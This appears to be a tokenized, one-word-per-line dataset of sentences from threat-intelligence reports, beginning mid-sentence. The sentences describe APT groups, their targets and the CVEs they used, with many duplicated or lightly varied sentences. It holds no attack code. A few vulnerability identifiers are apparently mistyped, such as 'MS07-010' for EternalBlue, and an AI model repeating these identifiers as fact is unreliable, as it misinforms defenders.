found
that
cybercriminals
are
actively
focusing
on
SMBs
,
and
giving
particular
attention
to
accountants
.
 
Clever
Kitten
actors
have
a
strong
affinity
for
PHP
server-side
attacks
to
make
access
;
this
is
relatively
unique
amongst
targeted
attackers
who
often
favor
targeting
a
specific
individual
at
a
specific
organization
using
social
engineering
.
 
Some
of
the
exploit
server
paths
contain
modules
that
appear
to
have
been
designed
to
infect
Linux
computers
,
but
we
have
not
yet
located
the
Linux
backdoor
.
 
Confucius
targeted
a
particular
set
of
individuals
in
South
Asian
countries
,
such
as
military
personnel
and
businessmen
,
among
others
.
 
According
to
statistics
,
Corkow
primarily
targets
users
in
Russia
and
the
CIS
,
but
it
is
worth
noting
that
in
2014
the
amount
of
attacks
targeting
the
USA
increased
by
5
times
,
in
comparison
with
2011
.
 
The
threat
is
likely
targeting
employees
of
various
Palestinian
government
agencies
,
security
services
,
Palestinian
students
,
and
those
affiliated
with
the
Fatah
political
party
.
 
For
example
,
the
actors
behind
FrozenCell
used
a
spoofed
app
called
Tawjihi
2016
,
which
Jordanian
or
Palestinian
students
would
ordinarily
use
during
their
general
secondary
examination
.
 
The
titles
and
contents
of
these
files
suggest
that
the
actor
targeted
individuals
affiliated
with
these
government
agencies
and
the
Fatah
political
party
.
 
Political
entities
in
Central
Asia
have
been
targeted
throughout
2018
by
different
actors
,
including
IndigoZebra
,
Sofacy
(
with
Zebrocy
malware
)
and
most
recently
by
DustSquad
(
with
Octopus
malware
)
.
 
Targets
included
a
wide
array
of
high-profile
entities
,
including
intelligence
services
,
military
,
utility
providers
(
telecommunications
and
power
)
,
embassies
,
and
government
institutions
.
 
The
computers
of
diplomats
,
military
attachs
,
private
assistants
,
secretaries
to
Prime
Ministers
,
journalists
and
others
are
under
the
concealed
control
of
unknown
assailant
(s
)
.
 
The
banking
malware
GozNym
has
legs
;
only
a
few
weeks
after
the
hybrid
Trojan
was
discovered
,
it
has
reportedly
spread
into
Europe
and
begun
plaguing
banking
customers
in
Poland
with
redirection
attacks
.
 
We
noted
in
our
original
blog
the
large
amount
of
targeting
of
Iranian
citizens
in
this
campaign
,
we
observed
almost
one-third
of
all
victims
to
be
Iranian
.
 
Since
early
2013
,
we
have
observed
activity
from
a
unique
threat
actor
group
,
which
we
began
to
investigate
based
on
increased
activities
against
human
right
activists
in
the
beginning
of
2015
.
 
Over
the
course
of
three
years
of
observation
of
campaigns
targeting
civil
society
and
human
rights
organizations
,
from
records
of
well
over
two
hundred
spearphishing
and
other
intrusion
attempts
against
individuals
inside
of
Iran
and
in
the
diaspora
,
a
narrative
of
persistent
intrusion
efforts
emerges
.
 
Over
the
months
following
the
elections
,
the
accounts
of
Iranians
that
had
been
compromised
by
the
actors
were
then
used
for
spreading
the
malware
.
 
The
Infy
malware
was
seen
targeting
Iranians
again
in
June
2015
,
when
it
was
shared
with
researchers
after
being
sent
to
a
broadcast
journalist
at
BBC
Persian
with
a
generic
introduction
and
a
PowerPoint
presentation
attached
titled
"
Nostalogy
"
(
sic
)
.
 
One
narrowly-targeted
spearphishing
from
Infy
was
sent
from
the
compromised
account
of
a
political
activist
promoting
participation
inside
of
Iran
,
claiming
to
be
a
set
of
images
of
a
British-Iranian
dual
national
that
has
been
held
in
Evin
Prison
for
five
years
on
espionage
charges
.
 
As
in
the
past
,
these
messages
have
been
sent
accounts
believed
to
be
fake
and
accounts
compromised
by
Infy
,
including
Kurdish
activists
that
had
previously
been
compromised
by
the
Flying
Kitten
actor
group
.
 
The
Windows
10
Creators
Update
will
bring
several
enhancements
to
Windows
Defender
ATP
that
will
provide
SOC
personnel
with
options
for
immediate
mitigation
of
a
detected
threat
.
 
LEAD
and
Barium
are
not
known
for
large-scale
spear-phishing
,
so
it
is
unlikely
that
SOC
personnel
would
have
to
deal
with
multiple
machines
having
been
compromised
by
these
groups
at
the
same
time
.
 
While
the
machine
is
in
isolation
,
SOC
personnel
can
direct
the
infected
machine
to
collect
live
investigation
data
,
such
as
the
DNS
cache
or
security
event
logs
,
which
they
can
use
to
verify
alerts
,
assess
the
state
of
the
intrusion
,
and
support
follow-up
actions
.
 
The
samples
provided
were
alleged
to
be
targeting
Tibetan
and
Chinese
Pro-Democracy
Activists
.
 
They
are
often
targeted
simultaneously
with
other
ethnic
minorities
and
religious
groups
in
China
.
 
Examples
as
early
as
2008
document
malware
operations
against
Tibetan
non-governmental
organizations
(
NGOs
)
that
also
targeted
Falun
Gong
and
Uyghur
groups
.
 
Unit
42
recently
identified
a
targeted
attack
against
an
individual
working
for
the
Foreign
Ministry
of
Uzbekistan
in
China
.
 
NetTraveler
has
been
used
to
target
diplomats
,
embassies
and
government
institutions
for
over
a
decade
,
and
remains
the
tool
of
choice
by
the
adversaries
behind
these
cyber
espionage
campaigns
.
 
The
NetTraveler
group
has
infected
victims
across
multiple
establishments
in
both
the
public
and
private
sector
including
government
institutions
,
embassies
,
the
oil
and
gas
industry
,
research
centers
,
military
contractors
and
activists
.
 
The
main
point
that
sets
Operation
Groundbait
apart
from
the
other
attacks
is
that
it
has
mostly
been
targeting
anti-government
separatists
in
the
self-declared
Donetsk
and
Luhansk
People
's
Republics
.
 
Although
Silence
's
phishing
emails
were
also
sent
to
bank
employees
in
Central
and
Western
Europe
,
Africa
,
and
Asia
)
.
 
They
tried
new
techniques
to
steal
from
banking
systems
,
including
AWS
CBR
(
the
Russian
Central
Bank
's
Automated
Workstation
Client
)
,
ATMs
,
and
card
processing
.
 
However
,
some
phishing
emails
were
sent
to
bank
employees
in
more
than
25
countries
of
Central
and
Western
Europe
,
Africa
and
Asia
including
:
Kyrgyzstan
,
Armenia
,
Georgia
,
Serbia
,
Germany
,
Latvia
,
Czech
Republic
,
Romania
,
Kenya
,
Israel
,
Cyprus
,
Greece
,
Turkey
,
Taiwan
,
Malaysia
,
Switzerland
,
Vietnam
,
Austria
,
Uzbekistan
,
Great
Britain
,
Hong
Kong
,
and
others
.
 
An
interesting
point
in
the
Silence
attack
is
that
the
cybercriminals
had
already
compromised
banking
infrastructure
in
order
to
send
their
spear-phishing
emails
from
the
addresses
of
real
bank
employees
and
look
as
unsuspicious
as
possible
to
future
victims
.
 
A
preliminary
analysis
caught
the
attention
of
our
Threat
Analysis
and
Intelligence
team
as
it
yielded
interesting
data
that
,
among
other
things
,
shows
that
Silence
was
targeting
employees
from
financial
entities
,
specifically
in
the
Russian
Federation
and
the
Republic
of
Belarus
.
 
While
the
Sima
moniker
could
similarly
originate
from
software
labels
,
it
is
a
common
female
Persian
name
and
a
Persian-language
Word
for
"
visage
"
or
"
appearance
"
.
 
Given
its
use
in
more
advanced
social
engineering
campaigns
against
women
's
rights
activists
,
the
label
seem
particularly
apt
.
 
Samples
and
resource
names
contained
the
family
names
of
prominent
Iranians
,
and
several
of
these
individuals
received
the
malware
located
in
their
respective
folder
.
 
For
the
sake
of
narrative
we
are
going
to
focus
exclusively
to
those
samples
we
identified
being
used
in
attacks
against
Iranian
civil
society
and
diaspora
.
 
After
reviewing
all
the
malware
functionalities
,
we
are
confident
in
saying
that
the
attackers
look
for
victims
who
answer
well-defined
characteristics
and
believe
that
further
stages
of
the
attack
are
delivered
only
to
those
who
fit
the
specific
victim
profile
.
 
It's
coincident
that
both
'darkhydrus'
APT
group
name
and
Williams
user
name
in
PDB
path
found
in
this
Twitter
user
.
 
The
360
Intelligence
Center
observed
four
distinct
campaigns
against
Pakistan
since
2017
(link)
,
recently
targeting
Pakistani
businessmen
working
in
China
.
 
In
the
latest
attack
,
Donot
group
is
targeting
Pakistani
businessman
working
in
China
A
previous
,
removed
,
report
from
another
vendor
claimed
non-specific
information
about
the
groups'
interest
in
Chinese
universities
,
but
that
report
has
been
removed
most
likely
detections
were
related
to
students
and
researchers
scanning
known
collected
samples
and
any
incidents
remain
unconfirmed
and
unknown
.
 
The
most
popular
targets
of
SneakyPastes
are
embassies
,
government
entities
,
education
,
media
outlets
,
journalists
,
activists
,
political
parties
or
personnel
,
healthcare
and
banking
.
 
Through
our
continuous
monitoring
of
threats
during
2018
,
we
observed
a
new
wave
of
attacks
by
Gaza
Cybergang
Group1
targeting
embassies
and
political
personnel
.
 
This
could
include
diplomats
,
experts
in
the
LOCs
of
interest
related
to
the
Digital
Economy
Task
Force
,
or
possibly
even
journalists
.
 
This
focus
on
training
aligns
with
LYCEUMs
targeting
of
executives
,
HR
staff
,
and
IT
personnel
.
 
Despite
the
initial
perception
that
the
maldoc
sample
was
intended
for
ICS
or
OT
staff
,
LYCEUM
has
not
demonstrated
an
interest
in
those
environments
.
 
The
threat
actors
emails
usually
contain
a
picture
or
a
link
without
a
malicious
payload
and
are
sent
out
to
a
huge
recipient
database
of
up
to
85
,
000
users
.
 
Group-IB
specialists
determined
that
the
email
addresses
of
IT
bank
employees
were
among
the
recipients
of
these
emails
.
 
While
OceanLotus
targets
are
global
,
their
operations
are
mostly
active
within
the
APAC
region
which
encompasses
targeting
private
sectors
across
multiple
industries
,
foreign
governments
,
activists
,
and
dissidents
connected
to
Vietnam
.
 
The
attackers
sent
multiple
emails
containing
macro-enabled
XLS
files
to
employees
working
in
the
banking
sector
in
the
Middle
East
.
 
Examples
as
early
as
2008
document
malware
operations
against
Tibetan
non-governmental
organizations
(
NGOs
)
that
also
targeted
Falun
Gong
and
Uyghur
groups
.
 
The
document
exploited
CVE-2012-0158
and
will
decode
and
write
an
executable
to
disk
upon
infection
.
 
iSiGHT
Partners
has
tracked
Sandworm
Team
for
some
time
-
and
we
publicly
reported
on
some
of
their
activities
in
October
2014
,
when
we
discovered
their
use
of
a
zero-day
exploit
,
CVE-2014-4114
.
 
In
July
of
2015
,
we
identified
a
full
e-mail
uploaded
to
an
antivirus
scanning
service
that
carried
a
Scarlet
Mimic
exploit
document
.
 
The
group
uses
legitimate
administration
tools
to
fly
under
the
radar
in
their
post-exploitation
phase
,
which
makes
detection
of
malicious
activity
,
as
well
as
attribution
more
complicated
.
 
Through
the
exploitation
of
the
HTA
handler
vulnerability
described
in
CVE-2017-1099
,
the
observed
RTF
attachments
download
.
 
In
early
May
,
the
phishing
lures
leveraged
RTF
attachments
that
exploited
the
Microsoft
Windows
vulnerability
described
in
CVE-2017-0199
.
 
As
early
as
March
4
,
2017
,
malicious
documents
exploiting
CVE-2017-0199
were
used
to
deliver
the
LATENTBOT
malware
.
 
FireEye
believes
that
two
actors
Turla
and
an
unknown
financially
motivated
actor
were
using
the
first
EPS
zero-day
CVE-2017-0261
,
and
APT28
was
using
the
second
EPS
zero-day
CVE-2017-0262
along
with
a
new
Escalation
of
Privilege
(EOP)
zero-day
CVE-2017-0263
.
 
The
first
,
st07383.en17.docx
,
continues
by
utilizing
32
or
64
bit
versions
of
CVE-2017-0001
to
escalate
privileges
before
executing
a
final
JavaScript
payload
containing
a
malware
implant
known
as
SHIRIME
.
 
This
vulnerability
was
found
in
a
document
named
Trump's_Attack_on_Syria_English.docx
.
 
It
is
possible
that
CVE-2017-8759
was
being
used
by
additional
actors
.
 
The
addition
of
the
EternalBlue
exploit
to
Metasploit
has
made
it
easy
for
threat
actors
to
exploit
these
vulnerabilities
.
 
The
Magnitude
EK
landing
page
consisted
of
CVE-2016-0189
,
which
was
first
reported
by
FireEye
as
being
used
in
Neutrino
Exploit
Kit
after
it
was
patched
.
 
The
malware
leverages
an
exploit
,
codenamed
EternalBlue
,
that
was
released
by
the
Shadow
Brokers
on
April
14
,
2017
.
 
Some
hackers
even
went
onto
use
the
Cisco
exploits
in
the
wild
.
 
DanderSpritz
is
the
framework
for
controlling
infected
machines
,
different
from
FuZZbuNch
as
the
latter
provides
a
limited
toolkit
for
the
post-exploitation
stage
with
specific
functions
such
as
DisableSecurity
and
EnableSecurity
for
DarkPulsar
.
 
In
their
latest
leak
,
they
have
released
the
UNITEDRAKE
NSA
exploit
,
which
is
a
remote
access
and
control
tool
that
can
remotely
target
Windows-based
systems
to
capture
desired
information
and
transfer
it
to
a
server
.
 
On
the
other
hand
,
ShadowBrokers
group
made
headlines
in
2016
when
it
claimed
to
have
robbed
various
exploitation
tools
used
by
the
NSA
including
the
notorious
EternalBlue
that
was
a
vital
component
in
the
WannaCry
ransomware
campaign
causing
damages
to
systems
worldwide
.
 
In
all
emails
sent
to
these
government
officials
,
the
actor
used
the
same
attachment
:
a
malicious
Microsoft
Word
document
that
exploited
the
CVE-2012-0158
vulnerability
to
drop
a
malicious
payload
.
 
Despite
being
an
older
vulnerability
,
many
threat
actors
continue
to
leverage
CVE-2012-0158
to
exploit
Microsoft
Word
.
 
According
to
the
security
firm
,
this
campaign
targeted
Indian
military
officials
via
spear-phishing
emails
,
distributing
spyware
to
its
victims
via
an
Adobe
Reader
vulnerability
.
 
In
order
to
carry
out
this
operation
,
it
uses
publicly
available
tools
,
including
Mimikatz
(
Hacktool.Mimikatz
)
and
an
open-source
tool
that
exploits
a
known
Windows
privilege
escalation
vulnerability
(
CVE-2016-0051
)
on
unpatched
computers
.
 
Each
of
the
spear
phishing
attacks
contained
links
to
.doc
files
,
which
were
really
RTF
documents
that
attempt
to
exploit
CVE-2017-8570
(
Composite
Moniker
)
.
 
The
Word
document
usually
exploits
CVE-2012-0158
.
 
Sometimes
the
attackers
send
an
MS
PowerPoint
document
instead
,
which
exploits
CVE-2014-6352
.
 
Sometimes
Patchwork
send
an
MS
PowerPoint
document
instead
,
which
exploits
CVE-2014-6352
.
 
The
malicious
documents
that
Unit
42
examined
contained
legitimate
decoy
lures
as
well
as
malicious
embedded
EPS
files
targeting
the
CVE-2015-2545
and
CVE-2017-0261
vulnerabilities
.
 
One
of
the
favorite
methods
used
by
the
Pitty
Tiger
group
to
infect
users
is
to
use
a
Microsoft
Office
Word
document
which
exploits
a
specific
vulnerability
(
CVE-2012-0158
)
.
 
The
document
,
when
opened
,
used
an
embedded
ActiveX
control
to
download
a
JavaScript
file
from
a
remote
site
that
used
a
previously
unknown
vulnerability
in
some
versions
of
Windows
(
later
designated
CVE-2013-7331
)
to
read
information
about
the
browser
's
installed
components
.
 
The
document
files
exploit
at
least
three
known
vulnerabilities
in
Microsoft
Office
,
which
we
discuss
in
the
Infection
Techniques
section
.
 
In
all
emails
sent
to
these
government
officials
,
the
actor
used
the
same
attachment
:
a
malicious
Microsoft
Word
document
that
exploited
the
CVE-2012-0158
vulnerability
to
drop
a
malicious
payload
.
 
According
to
the
security
firm
,
this
campaign
targeted
Indian
military
officials
via
spear-phishing
emails
,
distributing
spyware
to
its
victims
via
an
Adobe
Reader
vulnerability
.
 
PLATINUM
's
persistent
use
of
spear
phishing
tactics
(
phishing
attempts
aimed
at
specific
individuals
)
and
access
to
previously
undiscovered
zero-day
exploits
have
made
it
a
highly
resilient
threat
.
 
The
group
's
persistent
use
of
spear
phishing
tactics
(
phishing
attempts
aimed
at
specific
individuals
)
and
access
to
previously
undiscovered
zero-day
exploits
have
made
it
a
highly
resilient
threat
.
 
We
believe
that
the
Carbanak
campaign
is
a
clear
indicator
of
a
new
era
in
cybercrime
in
which
criminals
use
APT
techniques
directly
against
the
financial
industry
instead
of
through
its
customers
.
 
Carbanak
has
its
origin
in
more
common
financial
fraud
including
theft
from
consumer
and
corporate
bank
accounts
in
Europe
and
Russia
,
using
standard
banking
malware
,
mainly
Carberp
.
 
However
,
in
September
last
year
,
our
friends
at
CSIS
published
a
blog
detailing
a
new
Carbanak
variant
affecting
one
of
its
customers
.
 
PIVY
also
played
a
key
role
in
the
2011
campaign
known
as
Nitro
that
targeted
chemical
makers
,
government
agencies
,
defense
contractors
,
and
human
rights
groups.10,11
Still
active
a
year
later
,
the
Nitro
attackers
used
a
zero-day
vulnerability
in
Java
to
deploy
PIVY
in
2012
.
 
Each
of
the
spear
phishing
attacks
contained
links
to
.doc
files
,
which
were
really
RTF
documents
that
attempt
to
exploit
CVE-2017-8570
(
Composite
Moniker
)
.
 
The
Word
document
usually
exploits
CVE-2012-0158
.
 
Sometimes
the
attackers
send
an
MS
PowerPoint
document
instead
,
which
exploits
CVE-2014-6352
.
 
Sometimes
Patchwork
send
an
MS
PowerPoint
document
instead
,
which
exploits
CVE-2014-6352
.
 
The
malicious
documents
that
Unit
42
examined
contained
legitimate
decoy
lures
as
well
as
malicious
embedded
EPS
files
targeting
the
CVE-2015-2545
and
CVE-2017-0261
vulnerabilities
.
 
Older
documents
used
by
Patchwork
focused
on
the
CVE-2017-0261
vulnerability
,
however
in
late
January
2018
when
,
paradoxically
,
newer
documents
abandoned
this
vulnerability
to
attack
the
older
CVE-2015-2545
vulnerability
.
 
PittyTiger
has
also
been
seen
using
Heartbleed
vulnerability
in
order
to
directly
get
valid
credentials
.
 
They
have
also
been
seen
using
Heartbleed
vulnerability
in
order
to
directly
get
valid
credentials
.
 
One
of
the
favorite
methods
used
by
the
Pitty
Tiger
group
to
infect
users
is
to
use
a
Microsoft
Office
Word
document
which
exploits
a
specific
vulnerability
(
CVE-2012-0158
)
.
 
PittyTiger
could
also
use
CVE-2014-1761
,
which
is
more
recent
.
 
PLATINUM
is
known
to
have
used
a
number
of
zero-day
exploits
,
for
which
no
security
update
is
available
at
the
time
of
transmission
,
in
these
attempts
.
 
The
document
,
when
opened
,
used
an
embedded
ActiveX
control
to
download
a
JavaScript
file
from
a
remote
site
that
used
a
previously
unknown
vulnerability
in
some
versions
of
Windows
(
later
designated
CVE-2013-7331
)
to
read
information
about
the
browser
's
installed
components
.
 
When
the
document
was
opened
in
Word
,
PLATINUM
exploited
a
previously
unknown
vulnerability
in
the
Microsoft
Office
PostScript
interpreter
(
designated
CVE-2015-2545
)
that
enabled
it
to
execute
the
attacker
's
code
and
drop
an
attacker-generated
malicious
DLL
onto
the
computer
.
 
The
DLL
exploited
another
previously
unknown
vulnerability
(
designated
CVE-2015-2546
)
in
the
Windows
kernel
,
which
enabled
it
to
elevate
privileges
for
the
Word
executable
and
subsequently
install
a
backdoor
through
the
application
.
 
When
the
document
was
opened
in
Word
,
it
exploited
a
previously
unknown
vulnerability
in
the
Microsoft
Office
PostScript
interpreter
(
designated
CVE-2015-2545
)
that
enabled
it
to
execute
the
attacker
's
code
and
drop
an
attacker-generated
malicious
DLL
onto
the
computer
.
 
In
total
,
PLATINUM
made
use
of
four
zero-day
exploits
during
these
two
attack
campaigns
(
two
remote
code
execution
bugs
,
one
privilege
escalation
,
and
one
information
disclosure
)
,
showing
an
ability
to
spend
a
non-trivial
amount
of
resources
to
either
acquire
professionally
written
zero-day
exploits
from
unknown
markets
,
or
research
and
utilize
the
zero-day
exploits
themselves
.
 
PLATINUM
has
used
several
zero-day
exploits
against
their
victims
.
 
Even
if
CVE-2015-2546
affected
Windows
10
,
the
exploitation
would
have
required
much
more
technical
prowess
to
succeed
;
ultimately
,
SMEP
makes
it
more
difficult
for
attackers
.
 
For
example
,
one
zero-day
vulnerability
exploit
(
CVE-2015-2545
)
used
by
PLATINUM
was
addressed
immediately
in
September
2015
.
 
It
possesses
a
wide
range
of
technical
exploitation
capabilities
,
significant
resources
for
researching
or
purchasing
complicated
zero-day
exploits
,
the
ability
to
sustain
persistence
across
victim
networks
for
years
,
and
the
manpower
to
develop
and
maintain
a
large
number
of
tools
to
use
within
unique
victim
networks
.
 
In
2016
,
an
attack
campaign
by
this
group
was
recorded
in
early
May
that
made
use
of
an
exploit
for
CVE-2016-4117
,
a
vulnerability
in
Adobe
Flash
Player
,
which
at
the
time
was
both
unknown
and
unpatched
.
 
To
deliver
the
malware
to
the
victim
machines
,
the
Rocke
group
exploits
vulnerabilities
in
Apache
Struts
2
,
Oracle
WebLogic
,
and
Adobe
ColdFusion
.
 
However
,
around
a
month
ago
,
Rocke
started
targeting
systems
that
run
Jenkins
by
attempting
to
exploit
CVE-2018-1000861
and
CVE-2019-1003000
.
 
The
Shadow
Brokers
first
emerged
in
August
,
when
they
posted
links
to
a
selection
of
NSA
exploits
and
hacking
tools
onto
Github
and
other
websites
.
 
In
April
,
2018
,
the
360
Core
Security
takes
the
lead
in
capturing
the
APT-C-06
groups
new
APT
attack
using
0-day
vulnerabilities
CVE-2018-8174
in
the
wild
.
 
The
group
has
demonstrated
access
to
zero-day
vulnerabilities
CVE-2018-0802
,
and
the
ability
to
incorporate
them
into
operations
.
 
FireEye
observed
a
high
volume
of
activity
associated
with
the
exploitation
of
CVE-2017-10271
following
the
public
posting
of
proof
of
concept
code
in
December
2017
.
 
If
the
lateral
movement
with
credentials
fails
,
then
the
malware
uses
PingCastle
MS17-010
scanner
(PingCastle
is
a
French
Active
Directory
security
tool)
to
scan
that
particular
host
to
determine
if
its
vulnerable
to
EternalBlue
,
and
uses
it
to
spread
to
that
host
.
 
Tactic
#1:
Delivering
the
miner
directly
to
a
vulnerable
serverSome
tactics
we've
observed
involve
exploiting
CVE-2017-10271
,
leveraging
PowerShell
to
download
the
miner
directly
onto
the
victims
system
(Figure
1)
,
and
executing
it
using
ShellExecute()
.
 
We
assess
that
the
actors
employing
this
latest
Flash
zero-day
are
a
suspected
North
Korean
group
we
track
as
TEMP.Reaper
.
 
Figure
2:
Zyklon
attack
flowInfection
Techniques
CVE-2017-8759
.
 
This
vulnerability
was
discovered
by
FireEye
in
September
2017
,
and
it
is
a
vulnerability
we
have
observed
being
exploited
in
the
wild
.
 
Figure
3:
Embedded
URL
in
OLE
object
CVE-2017-11882
Similarly
,
we
have
also
observed
actors
leveraging
another
recently
discovered
vulnerability
CVE-2017-11882
in
Microsoft
Office
.
 
The
other
overlapping
files
are
tools
used
by
the
adversary
to
locate
other
systems
on
the
network
(
etool.exe
)
,
check
to
see
if
they
are
vulnerable
to
CVE-2017-0144
(
EternalBlue
)
patched
in
MS07-010
(
checker1.exe
)
and
pivot
to
them
using
remote
execution
functionality
offered
by
a
tool
similar
to
PsExec
offered
by
Impacket
(
psexec.exe
)
.
 
The
files
uploaded
to
this
webshell
included
the
same
compiled
python
script
that
would
scan
remote
systems
that
were
vulnerable
to
CVE-2017-0144
(
EternalBlue
)
that
we
saw
uploaded
to
the
other
errr.aspx
webshell
.
 
We
believe
the
actors
pivoted
to
other
systems
on
the
network
using
stolen
credentials
and
by
exploiting
the
CVE-2017-0144
(
EternalBlue
)
vulnerability
patched
in
MS17-010
.
 
Code
contained
inside
one
of
the
slides
triggers
an
exploit
for
CVE-2017-8759
,
a
remote
code
execution
vulnerability
in
Microsoft
.NET
framework
.
 
According
to
FireEye
,
the
admin@338
sent
out
emails
containing
malicious
documents
designed
to
exploit
Microsoft
Office
vulnerabilities
in
an
effort
to
deliver
a
piece
of
malware
dubbed
LOWBALL
.
 
According
to
FireEye
,
the
attackers
sent
out
emails
containing
malicious
documents
designed
to
exploit
Microsoft
Office
vulnerabilities
in
an
effort
to
deliver
a
piece
of
malware
dubbed
LOWBALL
.
 
Similar
to
RIPTIDE
campaigns
,
APT12
infects
target
systems
with
HIGHTIDE
using
a
Microsoft
Word
(
.doc
)
document
that
exploits
CVE-2012-0158
.
 
The
Sofacy
group
spearphished
targets
in
several
waves
with
Flash
exploits
leading
to
their
Carberp
based
JHUHUGIT
downloaders
and
further
stages
of
malware
.
 
APT28
spearphished
targets
in
several
waves
with
Flash
exploits
leading
to
their
Carberp
based
JHUHUGIT
downloaders
and
further
stages
of
malware
.
 
The
group
spearphished
targets
in
several
waves
with
Flash
exploits
leading
to
their
Carberp
based
JHUHUGIT
downloaders
and
further
stages
of
malware
.
 
APT28
is
using
novel
techniques
involving
the
EternalBlue
exploits
and
the
open
source
tool
Responder
to
spread
laterally
through
networks
and
likely
target
travelers
.
 
The
JHUHUGIT
implant
became
a
relatively
popular
first
stage
for
the
Sofacy
attacks
and
was
used
again
with
a
Java
zero-day
(
CVE-2015-2590
)
in
July
2015
.
 
We
are
however
only
aware
of
one
instance
-
the
exploitation
of
CVE-2013-0640
to
deploy
MiniDuke
-
where
we
believe
the
exploited
vulnerability
was
a
zero-day
at
the
time
that
the
group
acquired
the
exploit
.
 
FireEye
confirmed
that
since
at
least
November
2017
,
APT37
exploited
a
zero-day
Adobe
Flash
vulnerability
,
CVE-2018-4878
,
to
distribute
DOGCALL
malware
to
South
Korean
victims
.
 
FireEye
iSIGHT
Intelligence
confirmed
that
since
at
least
November
2017
,
APT37
exploited
a
zero-day
Adobe
Flash
vulnerability
,
CVE-2018-4878
,
to
distribute
DOGCALL
malware
to
South
Korean
victims
.
 
A
well-funded
,
highly
active
group
of
Middle
Eastern
hackers
was
caught
,
yet
again
,
using
a
lucrative
zero-day
exploit
in
the
wild
to
break
into
computers
and
infect
them
with
powerful
spyware
developed
by
an
infamous
cyberweapons
dealer
named
Gamma
Group
.
 
A
well-funded
,
highly
active
BlackOasis
group
of
Middle
Eastern
hackers
was
caught
,
yet
again
,
using
a
lucrative
zero-day
exploit
in
the
wild
to
break
into
computers
and
infect
them
with
powerful
spyware
developed
by
an
infamous
cyberweapons
dealer
named
Gamma
Group
.
 
Kaspersky
found
the
BlackOasis
group
was
exploiting
a
Adobe
Flash
Player
zero-day
vulnerability
(
CVE-2016-4117
)
to
remotely
deliver
the
latest
version
of
"
FinSpy
"
malware
,
according
to
a
new
blog
post
published
Monday
.
 
Kaspersky
found
the
group
was
exploiting
a
Adobe
Flash
Player
zero-day
vulnerability
(
CVE-2016-4117
)
to
remotely
deliver
the
latest
version
of
"
FinSpy
"
malware
,
according
to
a
new
blog
post
published
Monday
.
 
BRONZE
BUTLER
has
demonstrated
the
ability
to
identify
a
significant
zero-day
vulnerability
within
a
popular
Japanese
corporate
tool
and
then
use
scan-and-exploit
techniques
to
indiscriminately
compromise
Japanese
Internet-facing
enterprise
systems
.
 
The
group
has
demonstrated
the
ability
to
identify
a
significant
zero-day
vulnerability
within
a
popular
Japanese
corporate
tool
and
then
use
scan-and-exploit
techniques
to
indiscriminately
compromise
Japanese
Internet-facing
enterprise
systems
.
 
BRONZE
BUTLER
has
used
phishing
emails
with
Flash
animation
attachments
to
download
and
execute
Daserf
malware
,
and
has
also
leveraged
Flash
exploits
for
SWC
attacks
.
 
The
group
has
used
phishing
emails
with
Flash
animation
attachments
to
download
and
execute
Daserf
malware
,
and
has
also
leveraged
Flash
exploits
for
SWC
attacks
.
 
While
investigating
a
2016
intrusion
,
Secureworks
identified
BRONZE
BUTLER
exploiting
a
then-unpatched
remote
code
execution
vulnerability
(
CVE-2016-7836
)
in
SKYSEA
Client
View
,
a
popular
Japanese
product
used
to
manage
an
organization
.
 
While
investigating
a
2016
intrusion
,
Secureworks
incident
responders
identified
BRONZE
BUTLER
exploiting
a
then-unpatched
remote
code
execution
vulnerability
(
CVE-2016-7836
)
in
SKYSEA
Client
View
,
a
popular
Japanese
product
used
to
manage
an
organization
.
 
Carbanak
is
a
remote
backdoor
(
initially
based
on
Carberp
)
,
designed
for
espionage
,
data
Exfiltration
and
to
provide
remote
access
to
infected
machines
.
 
If
found
on
the
target
system
,
Carbanak
will
try
to
exploit
a
known
vulnerability
in
Windows
XP
,
Windows
Server
2003
,
Windows
Vista
,
Windows
Server
2008
,
Windows
7
,
Windows
8
,
and
Windows
Server
2012
,
CVE-2013-3660
,
for
local
privilege
escalation
.
 
To
enable
connections
to
the
infected
computer
using
the
Remote
Desktop
Protocol
(
RDP
)
,
Carbanak
sets
Termservice
service
execution
mode
to
Auto
.
 
Carbanak
is
also
aware
of
the
IFOBS
banking
application
and
can
,
on
command
,
substitute
the
details
of
payment
documents
in
the
IFOBS
system
.
 
Sensitive
bank
documents
have
be
found
on
the
servers
that
were
controlling
Carbanak
.
 
Existing
telemetry
indicates
that
the
Carbanak
attackers
are
trying
to
expand
operations
to
other
Baltic
and
Central
Europe
countries
,
the
Middle
East
,
Asia
and
Africa
.
 
We
believe
that
the
Carbanak
campaign
is
a
clear
indicator
of
a
new
era
in
cybercrime
in
which
criminals
use
APT
techniques
directly
against
the
financial
industry
instead
of
through
its
customers
.
 
This
report
describes
the
details
and
type
of
operations
carried
out
by
Carbanak
that
focuses
on
financial
industry
,
such
as
payment
providers
,
retail
industry
and
PR
companies
.
 
Carbanak
has
its
origin
in
more
common
financial
fraud
including
theft
from
consumer
and
corporate
bank
accounts
in
Europe
and
Russia
,
using
standard
banking
malware
,
mainly
Carberp
.
 
From
2013
Carbanak
intensified
its
activity
focused
on
banks
and
electronic
payment
systems
in
Russia
and
in
the
post-Soviet
space
.
 
Since
2013
Carbanak
has
successfully
gained
access
to
networks
of
more
than
50
banks
and
5
payment
systems
.
 
To
reduce
the
risk
of
losing
access
to
the
internal
bank
network
,
the
Carbanak
,
in
addition
to
malicious
programs
,
also
used
for
remote
access
legitimate
programs
such
as
Ammy
Admin
and
Team
Viewer
.
 
Additionally
the
reports
on
Carbanak
show
a
different
picture
,
where
banks
targeted
outside
of
Russia
,
specifically
Europe
,
USA
and
Japan
are
mentioned
,
which
does
not
match
our
research
.
 
These
attacks
have
included
criminal
groups
responsible
for
the
delivery
of
NewPosThings
,
MalumPOS
and
PoSeidon
point
of
sale
Malware
,
as
well
as
Carbanak
from
the
Russian
criminal
organization
we
track
as
Carbon
Spider
.
 
The
leader
of
the
crime
gang
behind
the
Carbanak
and
Cobalt
malware
attacks
targeting
over
a
100
financial
institutions
worldwide
has
been
arrested
in
Alicante
,
Spain
,
after
a
complex
investigation
conducted
by
the
Spanish
National
Police
.
 
Since
2013
,
the
cybercrime
gang
have
attempted
to
attack
banks
,
e-payment
systems
and
financial
institutions
using
pieces
of
malware
they
designed
,
known
as
Carbanak
and
Cobalt
.
 
Other
public
tools
used
by
the
CopyKittens
are
Metasploit
,
a
well-known
free
and
open
source
framework
for
developing
and
executing
exploit
code
against
a
remote
target
machine
;
Mimikatz
,
a
post-exploitation
tool
that
performs
credential
dumping
;
and
Empire
,
a
PowerShell
and
Python
post-exploitation
agent
.
 
Just
a
few
months
later
,
in
February
2015
,
we
announced
the
discovery
of
Carbanak
,
a
